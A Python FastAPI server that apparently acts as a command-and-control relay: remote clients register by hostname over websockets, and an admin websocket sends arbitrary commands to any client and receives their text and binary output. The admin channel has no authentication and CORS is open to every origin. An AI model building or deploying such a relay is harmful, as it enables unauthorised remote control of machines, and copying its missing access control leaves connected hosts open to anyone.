from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
import uvicorn
import time
import json
import os
import asyncio

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

clients = {}
last_seen = {}
client_infos = {}
admin_ws = None
hostname_map = {}  # hostname → client_id

async def ping_clients():
    while True:
        now = time.time()
        to_remove = []
        for client_id, ws in clients.items():
            try:
                await ws.send_text("ping")
            except:
                to_remove.append(client_id)
        for client_id in to_remove:
            clients.pop(client_id, None)
            last_seen.pop(client_id, None)
            client_infos.pop(client_id, None)
            for hostname, mapped_id in list(hostname_map.items()):
                if mapped_id == client_id:
                    hostname_map.pop(hostname, None)
        await asyncio.sleep(10)

@app.on_event("startup")
async def startup_event():
    asyncio.create_task(ping_clients())

@app.get("/clients")
async def list_clients():
    now = time.time()
    result = []
    for hostname, client_id in hostname_map.items():
        status = "Online" if now - last_seen.get(client_id, 0) < 20 else "Offline"
        info = client_infos.get(client_id, {})
        result.append({
            "id": client_id,
            "hostname": hostname,
            "status": status,
            "info": info
        })
    return {"clients": result}

@app.websocket("/ws/client/{client_id}")
async def websocket_client(websocket: WebSocket, client_id: str):
    await websocket.accept()

    # Warte bis wir client_info haben für hostname
    sysinfo = None
    while True:
        try:
            msg = await websocket.receive()
            if "text" in msg:
                try:
                    data = json.loads(msg["text"])
                    if data.get("type") == "client_info":
                        sysinfo = data.get("data", {})
                        client_infos[client_id] = sysinfo
                        break
                except:
                    pass
        except:
            return  # Falls kein client_info kommt → abbrechen

    hostname = sysinfo.get("hostname", client_id)

    # Check: existiert schon Client für hostname → alte Verbindung schließen
    old_id = hostname_map.get(hostname)
    if old_id and old_id != client_id:
        old_ws = clients.get(old_id)
        if old_ws:
            await old_ws.close()
        clients.pop(old_id, None)
        last_seen.pop(old_id, None)
        client_infos.pop(old_id, None)

    clients[client_id] = websocket
    hostname_map[hostname] = client_id
    last_seen[client_id] = time.time()

    try:
        while True:
            data = await websocket.receive()
            last_seen[client_id] = time.time()
            if "text" in data:
                msg = data["text"]
                if msg == "pong":
                    continue
                try:
                    obj = json.loads(msg)
                    if obj.get("type") == "client_info":
                        client_infos[client_id] = obj.get("data", {})
                        continue
                except:
                    pass
                if admin_ws:
                    await admin_ws.send_text(f"[{client_id}] {msg}")
            elif "bytes" in data:
                if admin_ws:
                    await admin_ws.send_bytes(data["bytes"])
    except WebSocketDisconnect:
        clients.pop(client_id, None)
        last_seen.pop(client_id, None)
        client_infos.pop(client_id, None)
        if hostname_map.get(hostname) == client_id:
            hostname_map.pop(hostname, None)

@app.websocket("/ws/admin")
async def websocket_admin(websocket: WebSocket):
    global admin_ws
    await websocket.accept()
    admin_ws = websocket
    try:
        while True:
            msg = await websocket.receive_json()
            target = msg.get("target")
            cmd = msg.get("cmd")
            if target in clients:
                await clients[target].send_text(cmd)
    except WebSocketDisconnect:
        admin_ws = None

@app.get("/")
async def serve_index():
    with open("static/index.html") as f:
        html_content = f.read()
    return HTMLResponse(content=html_content, status_code=200)

app.mount("/static", StaticFiles(directory="static"), name="static")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    uvicorn.run("main:app", host="0.0.0.0", port=port)
